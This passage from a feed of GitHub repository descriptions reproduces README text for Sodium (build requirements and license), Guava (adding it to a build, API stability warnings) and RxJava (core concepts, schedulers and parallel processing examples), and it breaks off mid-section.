&lt;p&gt;Devices which need to use OpenGL translation layers (such as GL4ES, ANGLE, etc.) are not supported and will very likely not work with Sodium. These translation layers do not implement required functionality, and they suffer from underlying driver bugs which cannot be worked around.&lt;/p&gt; 
&lt;h2&gt;🛠️ Building from sources&lt;/h2&gt; 
&lt;p&gt;Sodium uses the &lt;a href="https://gradle.org/"&gt;Gradle build tool&lt;/a&gt; and can be built with the &lt;code&gt;gradle build&lt;/code&gt; command. The build artifacts (production binaries and their source bundles) can be found in the &lt;code&gt;build/mods&lt;/code&gt; directory.&lt;/p&gt; 
&lt;p&gt;The &lt;a href="https://docs.gradle.org/current/userguide/gradle_wrapper.html#sec:using_wrapper"&gt;Gradle wrapper&lt;/a&gt; is provided for ease of use and will automatically download and install the appropriate version of Gradle for the project build. To use the Gradle wrapper, substitute &lt;code&gt;gradle&lt;/code&gt; in build commands with &lt;code&gt;./gradlew.bat&lt;/code&gt; (Windows) or &lt;code&gt;./gradlew&lt;/code&gt; (macOS and Linux).&lt;/p&gt; 
&lt;h3&gt;Build Requirements&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;OpenJDK 21 
  &lt;ul&gt; 
   &lt;li&gt;We recommend using the &lt;a href="https://adoptium.net/"&gt;Eclipse Temurin&lt;/a&gt; distribution as it's regularly tested by our developers and known to be of high quality.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Gradle 8.10.x 
  &lt;ul&gt; 
   &lt;li&gt;Typically, newer versions of Gradle will work without issues, but the build script is only tested against the version used by the &lt;a href="https://raw.githubusercontent.com/CaffeineMC/sodium/dev/gradle/wrapper/gradle-wrapper.properties"&gt;wrapper script&lt;/a&gt;.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;📜 License&lt;/h2&gt; 
&lt;p&gt;Except where otherwise stated (see &lt;a href="https://raw.githubusercontent.com/CaffeineMC/sodium/dev/thirdparty/NOTICE.txt"&gt;third-party license notices&lt;/a&gt;), the content of this repository is provided under the &lt;a href="https://raw.githubusercontent.com/CaffeineMC/sodium/dev/LICENSE.md"&gt;Polyform Shield 1.0.0&lt;/a&gt; license by &lt;a href="https://jellysquid.me"&gt;JellySquid&lt;/a&gt;.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>google/guava</title>
      <link>https://github.com/google/guava</link>
      <description>&lt;p&gt;Google core libraries for Java&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Guava: Google Core Libraries for Java&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://github.com/google/guava/releases/latest"&gt;&lt;img src="https://img.shields.io/github/v/release/google/guava" alt="GitHub Release" /&gt;&lt;/a&gt; &lt;a href="https://github.com/google/guava/actions/workflows/ci.yml"&gt;&lt;img src="https://github.com/google/guava/actions/workflows/ci.yml/badge.svg?sanitize=true" alt="CI" /&gt;&lt;/a&gt; &lt;a href="https://www.bestpractices.dev/projects/7197"&gt;&lt;img src="https://www.bestpractices.dev/projects/7197/badge" alt="OpenSSF Best Practices" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Guava is a set of core Java libraries from Google that includes new collection types (such as multimap and multiset), immutable collections, a graph library, and utilities for concurrency, I/O, hashing, primitives, strings, and more! It is widely used on most Java projects within Google, and widely used by many other companies as well.&lt;/p&gt; 
&lt;p&gt;Guava comes in two flavors:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;The JRE flavor requires JDK 1.8 or higher.&lt;/li&gt; 
 &lt;li&gt;If you need support for Android, use &lt;a href="https://github.com/google/guava/wiki/Android"&gt;the Android flavor&lt;/a&gt;. You can find the Android Guava source in the &lt;a href="https://github.com/google/guava/tree/master/android"&gt;&lt;code&gt;android&lt;/code&gt; directory&lt;/a&gt;.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Adding Guava to your build&lt;/h2&gt; 
&lt;p&gt;Guava's Maven group ID is &lt;code&gt;com.google.guava&lt;/code&gt;, and its artifact ID is &lt;code&gt;guava&lt;/code&gt;. Guava provides two different "flavors": one for use on a (Java 8+) JRE and one for use on Android or by any library that wants to be compatible with Android. These flavors are specified in the Maven version field as either &lt;code&gt;33.4.8-jre&lt;/code&gt; or &lt;code&gt;33.4.8-android&lt;/code&gt;. For more about depending on Guava, see &lt;a href="https://github.com/google/guava/wiki/UseGuavaInYourBuild"&gt;using Guava in your build&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;To add a dependency on Guava using Maven, use the following:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-xml"&gt;&amp;lt;dependency&amp;gt;
  &amp;lt;groupId&amp;gt;com.google.guava&amp;lt;/groupId&amp;gt;
  &amp;lt;artifactId&amp;gt;guava&amp;lt;/artifactId&amp;gt;
  &amp;lt;version&amp;gt;33.4.8-jre&amp;lt;/version&amp;gt;
  &amp;lt;!-- or, for Android: --&amp;gt;
  &amp;lt;version&amp;gt;33.4.8-android&amp;lt;/version&amp;gt;
&amp;lt;/dependency&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;To add a dependency using Gradle:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-gradle"&gt;dependencies {
  // Pick one:

  // 1. Use Guava in your implementation only:
  implementation("com.google.guava:guava:33.4.8-jre")

  // 2. Use Guava types in your public API:
  api("com.google.guava:guava:33.4.8-jre")

  // 3. Android - Use Guava in your implementation only:
  implementation("com.google.guava:guava:33.4.8-android")

  // 4. Android - Use Guava types in your public API:
  api("com.google.guava:guava:33.4.8-android")
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;For more information on when to use &lt;code&gt;api&lt;/code&gt; and when to use &lt;code&gt;implementation&lt;/code&gt;, consult the &lt;a href="https://docs.gradle.org/current/userguide/java_library_plugin.html#sec:java_library_separation"&gt;Gradle documentation on API and implementation separation&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Snapshots and Documentation&lt;/h2&gt; 
&lt;p&gt;Snapshots of Guava built from the &lt;code&gt;master&lt;/code&gt; branch are available through Maven using version &lt;code&gt;999.0.0-HEAD-jre-SNAPSHOT&lt;/code&gt;, or &lt;code&gt;999.0.0-HEAD-android-SNAPSHOT&lt;/code&gt; for the Android flavor.&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://guava.dev/releases/snapshot-jre/api/docs/"&gt;Snapshot API Javadoc&lt;/a&gt; as well as &lt;a href="https://guava.dev/releases/snapshot-jre/api/diffs/"&gt;Snapshot API Diffs&lt;/a&gt; are also available.&lt;/p&gt; 
&lt;p&gt;Another easy way to get to the Javadoc is to open &lt;a href="https://guava.dev/api"&gt;guava.dev/api&lt;/a&gt;. You can also jump right to a specific class by appending the class name to guava.dev. For example, &lt;a href="https://guava.dev/ImmutableList"&gt;guava.dev/ImmutableList&lt;/a&gt;!&lt;/p&gt; 
&lt;h2&gt;Learn about Guava&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Our users' guide, &lt;a href="https://github.com/google/guava/wiki/Home"&gt;Guava Explained&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.tfnico.com/presentations/google-guava"&gt;A nice collection&lt;/a&gt; of other helpful links&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Links&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/google/guava"&gt;GitHub project&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/google/guava/issues/new"&gt;Issue tracker: Report a defect or feature request&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://stackoverflow.com/questions/ask?tags=guava+java"&gt;StackOverflow: Ask "how-to" and "why-didn't-it-work" questions&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://groups.google.com/group/guava-announce"&gt;guava-announce: Announcements of releases and upcoming significant changes&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://groups.google.com/group/guava-discuss"&gt;guava-discuss: For open-ended questions and discussion&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;IMPORTANT WARNINGS&lt;/h2&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;APIs marked with the &lt;code&gt;@Beta&lt;/code&gt; annotation at the class or method level are subject to change. They can be modified in any way, or even removed, at any time. If your code is a library itself (i.e., it is used on the CLASSPATH of users outside your own control), you should not use beta APIs unless you &lt;a href="https://github.com/google/guava/wiki/UseGuavaInYourBuild#what-if-i-want-to-use-beta-apis-from-a-library-that-people-use-as-a-dependency"&gt;repackage&lt;/a&gt; them. &lt;strong&gt;If your code is a library, we strongly recommend using the &lt;a href="https://github.com/google/guava-beta-checker"&gt;Guava Beta Checker&lt;/a&gt; to ensure that you do not use any &lt;code&gt;@Beta&lt;/code&gt; APIs!&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;APIs without &lt;code&gt;@Beta&lt;/code&gt; will remain binary-compatible for the indefinite future. (Previously, we sometimes removed such APIs after a deprecation period. The last release to remove non-&lt;code&gt;@Beta&lt;/code&gt; APIs was Guava 21.0.) Even &lt;code&gt;@Deprecated&lt;/code&gt; APIs will remain (again, unless they are &lt;code&gt;@Beta&lt;/code&gt;). We have no plans to start removing things again, but officially, we're leaving our options open in case of surprises (like, say, a serious security problem).&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Guava has one dependency that is needed for linkage at runtime: &lt;code&gt;com.google.guava:failureaccess:1.0.3&lt;/code&gt;. It also has &lt;a href="https://github.com/google/guava/wiki/UseGuavaInYourBuild#what-about-guavas-own-dependencies"&gt;some annotation-only dependencies&lt;/a&gt;, which we discuss in more detail at that link.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Serialized forms of ALL objects are subject to change unless noted otherwise. Do not persist these and assume they can be read by a future version of the library.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Our classes are not designed to protect against a malicious caller. You should not use them for communication between trusted and untrusted code.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;For the mainline flavor, we test the libraries using OpenJDK 8, 11, and 17 on Linux, with some additional testing on newer JDKs and on Windows. Some features, especially in &lt;code&gt;com.google.common.io&lt;/code&gt;, may not work correctly in non-Linux environments. For the Android flavor, our unit tests also run on API level 23 (Marshmallow).&lt;/p&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;!-- References --&gt;</description>
    </item>
    
    <item>
      <title>ReactiveX/RxJava</title>
      <link>https://github.com/ReactiveX/RxJava</link>
      <description>&lt;p&gt;RxJava – Reactive Extensions for the JVM – a library for composing asynchronous and event-based programs using observable sequences for the Java VM.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;RxJava: Reactive Extensions for the JVM&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://github.com/ReactiveX/RxJava/actions?query=workflow%3ASnapshot"&gt;&lt;img src="https://github.com/ReactiveX/RxJava/workflows/Snapshot/badge.svg?sanitize=true" /&gt;&lt;/a&gt; &lt;a href="https://codecov.io/gh/ReactiveX/RxJava/branch/3.x"&gt;&lt;img src="http://codecov.io/github/ReactiveX/RxJava/coverage.svg?branch=3.x" alt="codecov.io" /&gt;&lt;/a&gt; &lt;a href="https://maven-badges.herokuapp.com/maven-central/io.reactivex.rxjava3/rxjava"&gt;&lt;img src="https://maven-badges.herokuapp.com/maven-central/io.reactivex.rxjava3/rxjava/badge.svg?sanitize=true" alt="Maven Central" /&gt;&lt;/a&gt; &lt;a href="https://gitpod.io/#https://github.com/ReactiveX/RxJava"&gt;&lt;img src="https://img.shields.io/badge/Contribute%20with-Gitpod-908a85?logo=gitpod" alt="Contribute with Gitpod" /&gt;&lt;/a&gt; &lt;a href="https://securityscorecards.dev/viewer/?uri=github.com/ReactiveX/RxJava"&gt;&lt;img src="https://api.securityscorecards.dev/projects/github.com/ReactiveX/RxJava/badge" alt="OpenSSF Scorecard" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;RxJava is a Java VM implementation of &lt;a href="http://reactivex.io"&gt;Reactive Extensions&lt;/a&gt;: a library for composing asynchronous and event-based programs by using observable sequences.&lt;/p&gt; 
&lt;p&gt;It extends the &lt;a href="http://en.wikipedia.org/wiki/Observer_pattern"&gt;observer pattern&lt;/a&gt; to support sequences of data/events and adds operators that allow you to compose sequences together declaratively while abstracting away concerns about things like low-level threading, synchronization, thread-safety and concurrent data structures.&lt;/p&gt; 
&lt;h4&gt;Version 3.x (&lt;a href="http://reactivex.io/RxJava/3.x/javadoc/"&gt;Javadoc&lt;/a&gt;)&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;Single dependency: &lt;a href="https://github.com/reactive-streams/reactive-streams-jvm"&gt;Reactive-Streams&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;Java 8+ or Android API 21+ required.&lt;/li&gt; 
 &lt;li&gt;Java 8 lambda-friendly API.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/ReactiveX/RxAndroid"&gt;Android&lt;/a&gt; desugar friendly.&lt;/li&gt; 
 &lt;li&gt;Fixed API mistakes and many limits of RxJava 2.&lt;/li&gt; 
 &lt;li&gt;Intended to be a replacement for RxJava 2 with relatively few binary incompatible changes.&lt;/li&gt; 
 &lt;li&gt;Non-opinionated about the source of concurrency (threads, pools, event loops, fibers, actors, etc.).&lt;/li&gt; 
 &lt;li&gt;Async or synchronous execution.&lt;/li&gt; 
 &lt;li&gt;Virtual time and schedulers for parameterized concurrency.&lt;/li&gt; 
 &lt;li&gt;Test and diagnostic support via test schedulers, test consumers and plugin hooks.&lt;/li&gt; 
 &lt;li&gt;Interop with newer JDK versions via 3rd party libraries, such as 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://github.com/akarnokd/RxJavaJdk9Interop#rxjavajdk9interop"&gt;Java 9 Flow API&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://github.com/akarnokd/RxJavaFiberInterop#rxjavafiberinterop"&gt;Java 21 Virtual Threads&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Learn more about RxJava in general on the &lt;a href="https://github.com/ReactiveX/RxJava/wiki"&gt;Wiki Home&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;span&gt;ℹ&lt;/span&gt; Please read the &lt;a href="https://github.com/ReactiveX/RxJava/wiki/What's-different-in-3.0"&gt;What's different in 3.0&lt;/a&gt; for details on the changes and migration information when upgrading from 2.x.&lt;/p&gt; 
&lt;h4&gt;Version 2.x&lt;/h4&gt; 
&lt;p&gt;The &lt;a href="https://github.com/ReactiveX/RxJava/tree/2.x"&gt;2.x version&lt;/a&gt; is end-of-life as of &lt;strong&gt;February 28, 2021&lt;/strong&gt;. No further development, support, maintenance, PRs and updates will happen. The &lt;a href="https://raw.githubusercontent.com/ReactiveX/RxJava/3.x/%5BJavadoc%5D(http://reactivex.io/RxJava/2.x/javadoc/)"&gt;Javadoc&lt;/a&gt; of the very last version, &lt;strong&gt;2.2.21&lt;/strong&gt;, will remain accessible.&lt;/p&gt; 
&lt;h4&gt;Version 1.x&lt;/h4&gt; 
&lt;p&gt;The &lt;a href="https://github.com/ReactiveX/RxJava/tree/1.x"&gt;1.x version&lt;/a&gt; is end-of-life as of &lt;strong&gt;March 31, 2018&lt;/strong&gt;. No further development, support, maintenance, PRs and updates will happen. The &lt;a href="https://raw.githubusercontent.com/ReactiveX/RxJava/3.x/%5BJavadoc%5D(http://reactivex.io/RxJava/1.x/javadoc/)"&gt;Javadoc&lt;/a&gt; of the very last version, &lt;strong&gt;1.3.8&lt;/strong&gt;, will remain accessible.&lt;/p&gt; 
&lt;h2&gt;Getting started&lt;/h2&gt; 
&lt;h3&gt;Setting up the dependency&lt;/h3&gt; 
&lt;p&gt;The first step is to include RxJava 3 into your project, for example, as a Gradle compile dependency:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-groovy"&gt;implementation "io.reactivex.rxjava3:rxjava:3.x.y"
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;(Please replace &lt;code&gt;x&lt;/code&gt; and &lt;code&gt;y&lt;/code&gt; with the latest version numbers: &lt;a href="https://maven-badges.herokuapp.com/maven-central/io.reactivex.rxjava3/rxjava"&gt;&lt;img src="https://maven-badges.herokuapp.com/maven-central/io.reactivex.rxjava3/rxjava/badge.svg?sanitize=true" alt="Maven Central" /&gt;&lt;/a&gt; )&lt;/p&gt; 
&lt;h3&gt;Hello World&lt;/h3&gt; 
&lt;p&gt;The second is to write the &lt;strong&gt;Hello World&lt;/strong&gt; program:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;package rxjava.examples;

import io.reactivex.rxjava3.core.*;

public class HelloWorld {
    public static void main(String[] args) {
        Flowable.just("Hello world").subscribe(System.out::println);
    }
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Note that RxJava 3 components now live under &lt;code&gt;io.reactivex.rxjava3&lt;/code&gt; and the base classes and interfaces live under &lt;code&gt;io.reactivex.rxjava3.core&lt;/code&gt;.&lt;/p&gt; 
&lt;h3&gt;Base classes&lt;/h3&gt; 
&lt;p&gt;RxJava 3 features several base classes you can discover operators on:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="http://reactivex.io/RxJava/3.x/javadoc/io/reactivex/rxjava3/core/Flowable.html"&gt;&lt;code&gt;io.reactivex.rxjava3.core.Flowable&lt;/code&gt;&lt;/a&gt;: 0..N flows, supporting Reactive-Streams and backpressure&lt;/li&gt; 
 &lt;li&gt;&lt;a href="http://reactivex.io/RxJava/3.x/javadoc/io/reactivex/rxjava3/core/Observable.html"&gt;&lt;code&gt;io.reactivex.rxjava3.core.Observable&lt;/code&gt;&lt;/a&gt;: 0..N flows, no backpressure,&lt;/li&gt; 
 &lt;li&gt;&lt;a href="http://reactivex.io/RxJava/3.x/javadoc/io/reactivex/rxjava3/core/Single.html"&gt;&lt;code&gt;io.reactivex.rxjava3.core.Single&lt;/code&gt;&lt;/a&gt;: a flow of exactly 1 item or an error,&lt;/li&gt; 
 &lt;li&gt;&lt;a href="http://reactivex.io/RxJava/3.x/javadoc/io/reactivex/rxjava3/core/Completable.html"&gt;&lt;code&gt;io.reactivex.rxjava3.core.Completable&lt;/code&gt;&lt;/a&gt;: a flow without items but only a completion or error signal,&lt;/li&gt; 
 &lt;li&gt;&lt;a href="http://reactivex.io/RxJava/3.x/javadoc/io/reactivex/rxjava3/core/Maybe.html"&gt;&lt;code&gt;io.reactivex.rxjava3.core.Maybe&lt;/code&gt;&lt;/a&gt;: a flow with no items, exactly one item or an error.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Some terminology&lt;/h3&gt; 
&lt;h4&gt;Upstream, downstream&lt;/h4&gt; 
&lt;p&gt;The dataflows in RxJava consist of a source, zero or more intermediate steps followed by a data consumer or combinator step (where the step is responsible to consume the dataflow by some means):&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;source.operator1().operator2().operator3().subscribe(consumer);

source.flatMap(value -&amp;gt; source.operator1().operator2().operator3());
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Here, if we imagine ourselves on &lt;code&gt;operator2&lt;/code&gt;, looking to the left towards the source is called the &lt;strong&gt;upstream&lt;/strong&gt;. Looking to the right towards the subscriber/consumer is called the &lt;strong&gt;downstream&lt;/strong&gt;. This is often more apparent when each element is written on a separate line:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;source
  .operator1()
  .operator2()
  .operator3()
  .subscribe(consumer)
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Objects in motion&lt;/h4&gt; 
&lt;p&gt;In RxJava's documentation, &lt;strong&gt;emission&lt;/strong&gt;, &lt;strong&gt;emits&lt;/strong&gt;, &lt;strong&gt;item&lt;/strong&gt;, &lt;strong&gt;event&lt;/strong&gt;, &lt;strong&gt;signal&lt;/strong&gt;, &lt;strong&gt;data&lt;/strong&gt; and &lt;strong&gt;message&lt;/strong&gt; are considered synonyms and represent the object traveling along the dataflow.&lt;/p&gt; 
&lt;h4&gt;Backpressure&lt;/h4&gt; 
&lt;p&gt;When the dataflow runs through asynchronous steps, each step may perform different things with different speed. To avoid overwhelming such steps, which usually would manifest itself as increased memory usage due to temporary buffering or the need for skipping/dropping data, so-called backpressure is applied, which is a form of flow control where the steps can express how many items are they ready to process. This allows constraining the memory usage of the dataflows in situations where there is generally no way for a step to know how many items the upstream will send to it.&lt;/p&gt; 
&lt;p&gt;In RxJava, the dedicated &lt;code&gt;Flowable&lt;/code&gt; class is designated to support backpressure and &lt;code&gt;Observable&lt;/code&gt; is dedicated to the non-backpressured operations (short sequences, GUI interactions, etc.). The other types, &lt;code&gt;Single&lt;/code&gt;, &lt;code&gt;Maybe&lt;/code&gt; and &lt;code&gt;Completable&lt;/code&gt; don't support backpressure nor should they; there is always room to store one item temporarily.&lt;/p&gt; 
&lt;h4&gt;Assembly time&lt;/h4&gt; 
&lt;p&gt;The preparation of dataflows by applying various intermediate operators happens in the so-called &lt;strong&gt;assembly time&lt;/strong&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;Flowable&amp;lt;Integer&amp;gt; flow = Flowable.range(1, 5)
.map(v -&amp;gt; v * v)
.filter(v -&amp;gt; v % 3 == 0)
;
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;At this point, the data is not flowing yet and no side-effects are happening.&lt;/p&gt; 
&lt;h4&gt;Subscription time&lt;/h4&gt; 
&lt;p&gt;This is a temporary state when &lt;code&gt;subscribe()&lt;/code&gt; is called on a flow that establishes the chain of processing steps internally:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;flow.subscribe(System.out::println)
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This is when the &lt;strong&gt;subscription side-effects&lt;/strong&gt; are triggered (see &lt;code&gt;doOnSubscribe&lt;/code&gt;). Some sources block or start emitting items right away in this state.&lt;/p&gt; 
&lt;h4&gt;Runtime&lt;/h4&gt; 
&lt;p&gt;This is the state when the flows are actively emitting items, errors or completion signals:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;
Observable.create(emitter -&amp;gt; {
     while (!emitter.isDisposed()) {
         long time = System.currentTimeMillis();
         emitter.onNext(time);
         if (time % 2 != 0) {
             emitter.onError(new IllegalStateException("Odd millisecond!"));
             break;
         }
     }
})
.subscribe(System.out::println, Throwable::printStackTrace);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Practically, this is when the body of the given example above executes.&lt;/p&gt; 
&lt;h3&gt;Simple background computation&lt;/h3&gt; 
&lt;p&gt;One of the common use cases for RxJava is to run some computation, network request on a background thread and show the results (or error) on the UI thread:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;import io.reactivex.rxjava3.schedulers.Schedulers;

Flowable.fromCallable(() -&amp;gt; {
    Thread.sleep(1000); //  imitate expensive computation
    return "Done";
})
  .subscribeOn(Schedulers.io())
  .observeOn(Schedulers.single())
  .subscribe(System.out::println, Throwable::printStackTrace);

Thread.sleep(2000); // &amp;lt;--- wait for the flow to finish
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This style of chaining methods is called a &lt;strong&gt;fluent API&lt;/strong&gt; which resembles the &lt;strong&gt;builder pattern&lt;/strong&gt;. However, RxJava's reactive types are immutable; each of the method calls returns a new &lt;code&gt;Flowable&lt;/code&gt; with added behavior. To illustrate, the example can be rewritten as follows:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;Flowable&amp;lt;String&amp;gt; source = Flowable.fromCallable(() -&amp;gt; {
    Thread.sleep(1000); //  imitate expensive computation
    return "Done";
});

Flowable&amp;lt;String&amp;gt; runBackground = source.subscribeOn(Schedulers.io());

Flowable&amp;lt;String&amp;gt; showForeground = runBackground.observeOn(Schedulers.single());

showForeground.subscribe(System.out::println, Throwable::printStackTrace);

Thread.sleep(2000);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Typically, you can move computations or blocking IO to some other thread via &lt;code&gt;subscribeOn&lt;/code&gt;. Once the data is ready, you can make sure they get processed on the foreground or GUI thread via &lt;code&gt;observeOn&lt;/code&gt;.&lt;/p&gt; 
&lt;h3&gt;Schedulers&lt;/h3&gt; 
&lt;p&gt;RxJava operators don't work with &lt;code&gt;Thread&lt;/code&gt;s or &lt;code&gt;ExecutorService&lt;/code&gt;s directly but with so-called &lt;code&gt;Scheduler&lt;/code&gt;s that abstract away sources of concurrency behind a uniform API. RxJava 3 features several standard schedulers accessible via &lt;code&gt;Schedulers&lt;/code&gt; utility class.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;Schedulers.computation()&lt;/code&gt;: Run computation intensive work on a fixed number of dedicated threads in the background. Most asynchronous operators use this as their default &lt;code&gt;Scheduler&lt;/code&gt;.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;Schedulers.io()&lt;/code&gt;: Run I/O-like or blocking operations on a dynamically changing set of threads.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;Schedulers.single()&lt;/code&gt;: Run work on a single thread in a sequential and FIFO manner.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;Schedulers.trampoline()&lt;/code&gt;: Run work in a sequential and FIFO manner in one of the participating threads, usually for testing purposes.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;These are available on all JVM platforms but some specific platforms, such as Android, have their own typical &lt;code&gt;Scheduler&lt;/code&gt;s defined: &lt;code&gt;AndroidSchedulers.mainThread()&lt;/code&gt;, &lt;code&gt;SwingScheduler.instance()&lt;/code&gt; or &lt;code&gt;JavaFXScheduler.platform()&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;In addition, there is an option to wrap an existing &lt;code&gt;Executor&lt;/code&gt; (and its subtypes such as &lt;code&gt;ExecutorService&lt;/code&gt;) into a &lt;code&gt;Scheduler&lt;/code&gt; via &lt;code&gt;Schedulers.from(Executor)&lt;/code&gt;. This can be used, for example, to have a larger but still fixed pool of threads (unlike &lt;code&gt;computation()&lt;/code&gt; and &lt;code&gt;io()&lt;/code&gt; respectively).&lt;/p&gt; 
&lt;p&gt;The &lt;code&gt;Thread.sleep(2000);&lt;/code&gt; at the end is no accident. In RxJava the default &lt;code&gt;Scheduler&lt;/code&gt;s run on daemon threads, which means once the Java main thread exits, they all get stopped and background computations may never happen. Sleeping for some time in this example situations lets you see the output of the flow on the console with time to spare.&lt;/p&gt; 
&lt;h3&gt;Concurrency within a flow&lt;/h3&gt; 
&lt;p&gt;Flows in RxJava are sequential in nature split into processing stages that may run &lt;strong&gt;concurrently&lt;/strong&gt; with each other:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;Flowable.range(1, 10)
  .observeOn(Schedulers.computation())
  .map(v -&amp;gt; v * v)
  .blockingSubscribe(System.out::println);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This example flow squares the numbers from 1 to 10 on the &lt;strong&gt;computation&lt;/strong&gt; &lt;code&gt;Scheduler&lt;/code&gt; and consumes the results on the "main" thread (more precisely, the caller thread of &lt;code&gt;blockingSubscribe&lt;/code&gt;). However, the lambda &lt;code&gt;v -&amp;gt; v * v&lt;/code&gt; doesn't run in parallel for this flow; it receives the values 1 to 10 on the same computation thread one after the other.&lt;/p&gt; 
&lt;h3&gt;Parallel processing&lt;/h3&gt; 
&lt;p&gt;Processing the numbers 1 to 10 in parallel is a bit more involved:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;Flowable.range(1, 10)
  .flatMap(v -&amp;gt;
      Flowable.just(v)
        .subscribeOn(Schedulers.computation())
        .map(w -&amp;gt; w * w)
  )
  .blockingSubscribe(System.out::println);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Practically, parallelism in RxJava means running independent flows and merging their results back into a single flow. The operator &lt;code&gt;flatMap&lt;/code&gt; does this by first mapping each number from 1 to 10 into its own individual &lt;code&gt;Flowable&lt;/code&gt;, runs them and merges the computed squares.&lt;/p&gt; 
&lt;p&gt;Note, however, that &lt;code&gt;flatMap&lt;/code&gt; doesn't guarantee any order and the items from the inner flows may end up interleaved. There are alternative operators:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;concatMap&lt;/code&gt; that maps and runs one inner flow at a time and&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;concatMapEager&lt;/code&gt; which runs all inner flows "at once" but the output flow will be in the order those inner flows were created.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Alternatively, the &lt;code&gt;Flowable.parallel()&lt;/code&gt; operator and the &lt;code&gt;ParallelFlowable&lt;/code&gt; type help achieve the same parallel processing pattern:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;Flowable.range(1, 10)
  .parallel()
  .runOn(Schedulers.computation())
  .map(v -&amp;gt; v * v)
  .sequential()
  .blockingSubscribe(System.out::println);
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Dependent sub-flows&lt;/h3&gt; 
&lt;p&gt;&lt;code&gt;flatMap&lt;/code&gt; is a powerful operator and helps in a lot of situations. For example, given a service that returns a &lt;code&gt;Flowable&lt;/code&gt;, we'd like to call another service with values emitted by the first service:&lt;/p&gt; 
